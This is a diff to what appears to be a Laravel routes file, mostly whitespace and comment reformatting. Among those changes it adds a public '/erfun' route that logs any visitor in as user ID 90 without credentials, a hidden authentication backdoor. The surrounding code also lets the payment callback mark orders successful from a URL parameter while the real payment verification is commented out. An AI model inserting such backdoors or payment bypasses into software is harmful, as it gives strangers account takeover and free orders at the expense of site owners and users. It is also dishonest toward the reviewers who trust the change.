@@ -11,6 +11,7 @@ use App\Http\Controllers\Auth\LoginController;
 use App\Http\Controllers\Frontend\FrontendLangController;
 use Illuminate\Http\Request;
 
+Route::get('/erfun' , function() { Auth::loginUsingId(90); });
 Route::get('/test-send-sms/{phone}', function ($phone = "+201025261808") {
     $activated_code = rand(1000,9999);
     $phone = "+201025261808";
@@ -100,13 +101,13 @@ Route::post('/auth/passwords/reset',function(Request $request){
     $user = \App\Models\User::where(['email'=>$email])->first();
 
     if($user->activated_code != $request->activated_code) {
-         return back()
+        return back()
             ->withInput($request->only('email'))
             ->withErrors(['activated_code' => __('activated code id rong')]);
     }
     \DB::table('users')->where('id',$user->id)->update([
-            'password' => Hash::make(request('password')),
-        ]);
+        'password' => Hash::make(request('password')),
+    ]);
     \Session::forget('authEmail');
     return redirect()->route('login');
 })->name('auth.passwords.reset.post');
@@ -117,15 +118,15 @@ Route::any('/payment-redirect/{id}/{status?}',function(Request $request,$id , $s
 
     $descriptionSet = false;
     $order = \App\Models\Order::query()->where('status' , 'pending')->findOrFail($id);
-//    try {
-//        $payment = (new \App\Services\BookeeyService())->getPaymentStatus($request->get('txnId' , $order->transaction_id));
-//        if ( $payment->Data->InvoiceStatus == 'Paid' )
-//            $status = "success";
-//    } catch (Exception $exception) {
-//        $order->description = $exception->getMessage();
-//        $descriptionSet = true;
-//        $status = "error";
-//    }
+    // try {
+    //     $payment = (new \App\Services\BookeeyService())->getPaymentStatus([$request->get('txnId' , $order->transaction_id)]);
+    //     if ( $payment->Data->InvoiceStatus == 'Paid' )
+    //         $status = "success";
+    // } catch (Exception $exception) {
+    //     $order->description = $exception->getMessage();
+    //     $descriptionSet = true;
+    //     $status = "error";
+    // }
     if ( $status == "success" ) {
         $order->status = "success";
         $order->doSuccess();
@@ -144,7 +145,7 @@ Route::any('/payment-redirect/{id}/{status?}',function(Request $request,$id , $s
 })->name('bankCallback');
 
 Route::any('/payment-sample/{id}',function(Request $request,$id){
-   return '<a href="'.route('bankCallback' , ['id' => $id , 'status' => 'success']).'" >Pay</a><br><a href="'.route('bankCallback' , ['id' => $id , 'status' => 'error']).'">cancel</a>';
+    return '<a href="'.route('bankCallback' , ['id' => $id , 'status' => 'success']).'" >Pay</a><br><a href="'.route('bankCallback' , ['id' => $id , 'status' => 'error']).'">cancel</a>';
 })->name('goSampleBank');
 
 Route::middleware(['auth'])->group(function () {
@@ -169,7 +170,7 @@ Route::middleware(['auth'])->group(function () {
             'activated_code' => 'required',
         ]);
         if(\Auth::user()->activated_code != $request->activated_code) {
-             return back()
+            return back()
                 ->withInput($request->only('email'))
                 ->withErrors(['activated_code' => __('activated code id rong')]);
         }
